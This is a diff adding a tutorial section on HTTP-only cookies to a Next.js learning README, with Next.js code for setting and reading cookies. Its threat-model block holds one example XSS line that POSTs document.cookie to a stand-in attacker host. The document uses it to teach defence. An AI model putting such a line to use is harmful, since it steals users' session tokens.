@@ -2073,6 +2073,179 @@ The `request.url` provides the origin (protocol + host + port). Without it, you'
 ---
 
 <details>
+<summary><strong>14. HTTP-only Cookies</strong> - Secure cookie storage that prevents client-side JavaScript access</summary>
+
+### Core Concepts
+
+| Cookie Attribute | Purpose                                 | Security Benefit                           |
+|------------------|-----------------------------------------|--------------------------------------------|
+| `httpOnly`       | Cookie cannot be accessed by JavaScript | Prevents XSS attacks from stealing cookies |
+| `secure`         | Cookie only sent over HTTPS             | Prevents man-in-the-middle attacks         |
+| `sameSite`       | Controls cross-site request behavior    | Prevents CSRF attacks                      |
+| `maxAge`         | Cookie lifespan in seconds              | Automatic expiration                       |
+| `path`           | Limits cookie scope to specific path    | Isolates cookies to specific routes        |
+
+### Common Confusion: HttpOnly vs Secure
+
+**⚠️ Easy to Mix Up:**
+
+- **`httpOnly`** → Cookie is **invisible to JavaScript** (`document.cookie`)
+    - Works on both HTTP and HTTPS
+    - Prevents XSS attacks from stealing cookies
+
+- **`secure`** → Cookie is **only sent over HTTPS**
+    - Requires HTTPS connection
+    - Prevents network-level interception
+
+**Key Insight:** They solve different problems! Use **both** for maximum security.
+
+### Security: Why HttpOnly Matters
+
+**The Threat Model:**
+
+```javascript
+// ❌ Without httpOnly - XSS attack can steal ALL cookies:
+fetch('https://attacker.com/steal', {
+  method: 'POST',
+  body: document.cookie  // ← Grabs session tokens!
+});
+```
+
+**Impact Comparison:**
+
+| Attack Type                   | Scale        | HttpOnly Protection |
+|-------------------------------|--------------|---------------------|
+| Manual theft (DevTools)       | 1 victim     | ❌ Still visible     |
+| XSS script injection          | ∞ victims    | ✅ Blocks access     |
+| Physical device access needed | Not scalable | Defense-in-depth    |
+| Remote automated attack       | Scalable     | **Prevented**       |
+
+**Why This Matters:**
+- HttpOnly doesn't make cookies **impossible** to steal
+- It makes them **economically unfeasible** to steal at scale
+- One XSS vulnerability without HttpOnly = thousands of stolen sessions
+- One XSS vulnerability with HttpOnly = attacker needs physical access to each device
+
+### Implementation
+
+**Server Action (sets HttpOnly cookie):**
+
+```typescript
+// lib/actions/cookie-actions.ts
+"use server";
+
+import { cookies } from "next/headers";
+
+async function setHttpOnlyCookies() {
+  const cookieStore = await cookies();
+  cookieStore.set('session-token', 'demo-session-' + Date.now(), {
+    httpOnly: true,      // ← Blocks JavaScript access
+    secure: true,        // ← HTTPS only
+    maxAge: 24 * 60 * 60,// 1 day
+    sameSite: 'strict',  // ← CSRF protection
+    path: '/',           // Available site-wide
+  });
+}
+```
+
+**Server Component (can read HttpOnly cookies):**
+
+```typescript
+// app/page.tsx
+import { cookies } from "next/headers";
+
+async function Page() {
+  const cookieStore = await cookies();
+  const allCookies = cookieStore.getAll();
+
+  // ✅ Server sees ALL cookies including httpOnly ones
+  return <div>{JSON.stringify(allCookies)}</div>;
+}
+```
+
+**Client Component (cannot read HttpOnly cookies):**
+
+```typescript
+// ClientReadCookies.tsx
+"use client";
+
+function ClientReadCookies() {
+  const [cookies, setCookies] = useState('');
+
+  return (
+    <button onClick={() => setCookies(document.cookie)}>
+      Read Cookies
+    </button>
+  );
+  // ❌ session-token will be MISSING from document.cookie
+}
+```
+
+### Key Learnings
+
+**✅ What You'll Observe:**
+
+| Location                         | Can See HttpOnly Cookie? | Why?                                  |
+|----------------------------------|--------------------------|---------------------------------------|
+| DevTools > Application > Cookies | ✅ Yes                    | Browser manages storage               |
+| Server Component                 | ✅ Yes                    | Reads from HTTP request headers       |
+| `document.cookie` (client)       | ❌ No                     | **HttpOnly blocks JavaScript access** |
+| Network tab (request headers)    | ✅ Yes                    | Automatically sent with requests      |
+
+**🎯 The Demo Proves:**
+
+```
+Server sees:
+  - cc_cookie (regular cookie)
+  - session-token (httpOnly) ← VISIBLE on server
+  - __next_hmr_refresh_hash__ (regular)
+
+Client sees:
+  - cc_cookie (regular cookie)
+  - __next_hmr_refresh_hash__ (regular)
+  - [session-token is MISSING] ← HttpOnly protection working!
+```
+
+**⚠️ Common Misconceptions:**
+
+- ❌ "HttpOnly means it needs HTTPS" → That's the `secure` flag
+- ❌ "Client can't see it in DevTools" → Still visible in Application tab
+- ❌ "It's impossible to steal" → Just not scalable via XSS
+- ✅ "JavaScript can't read it" → **Correct!** This prevents automated theft
+
+**🔒 Security Best Practices:**
+
+1. **Always use httpOnly for auth tokens** - No exceptions
+2. **Combine with secure flag** - Defense-in-depth
+3. **Use sameSite: 'strict'** - Additional CSRF protection
+4. **Set appropriate maxAge** - Limit exposure window
+5. **Server-side validation** - Cookie is just one layer
+
+### File Structure
+
+```
+app/http-only-cookies-demo/
+  page.tsx                    ← Server Component (reads cookies)
+  ClientReadCookies.tsx       ← Client Component (tries to read)
+lib/actions/
+  cookie-actions.ts           ← Server Action (sets httpOnly cookie)
+```
+
+### Demo: `http://localhost:3000/http-only-cookies-demo`
+
+**What to Try:**
+1. Click "Set" to create httpOnly cookie
+2. Check DevTools > Application > Cookies (you'll see session-token)
+3. Click "Read from Client" (session-token missing from JavaScript!)
+4. Look at server-rendered cookies (session-token visible)
+
+[Official Docs - cookies()](https://nextjs.org/docs/app/api-reference/functions/cookies)
+
+</details>
+
+---
+
+<details>
 <summary><strong>18. Next.js MCP Server (next-devtools-mcp)</strong> - AI-powered runtime diagnostics and documentation access for Next.js 16+</summary>
 
 ### Why MCP Matters
@@ -2909,13 +3082,13 @@ Symbol: ◐ (Partial Prerender - static shell + cached data)
 
 ### Key Insight: generateStaticParams Role Changed
 
-| Aspect            | Old Model (No Cache Components)      | New Model (Cache Components)              |
-|-------------------|--------------------------------------|-------------------------------------------|
-| **What it does**  | Generates static HTML files          | Pre-warms cache at build time             |
-| **Products 1-6**  | Fully baked HTML (0 delay always)    | Cache populated at build (0 delay always) |
-| **Product 7**     | 404 or on-demand generation          | Cached on-demand at runtime               |
-| **Build output**  | `○` Static                           | `◐` PPR (Partial Prerender)              |
-| **Route configs** | ✅ `dynamic`, `dynamicParams` work   | ❌ Incompatible, must remove              |
+| Aspect            | Old Model (No Cache Components)   | New Model (Cache Components)              |
+|-------------------|-----------------------------------|-------------------------------------------|
+| **What it does**  | Generates static HTML files       | Pre-warms cache at build time             |
+| **Products 1-6**  | Fully baked HTML (0 delay always) | Cache populated at build (0 delay always) |
+| **Product 7**     | 404 or on-demand generation       | Cached on-demand at runtime               |
+| **Build output**  | `○` Static                        | `◐` PPR (Partial Prerender)               |
+| **Route configs** | ✅ `dynamic`, `dynamicParams` work | ❌ Incompatible, must remove               |
 
 ### The "use cache" Directive
 
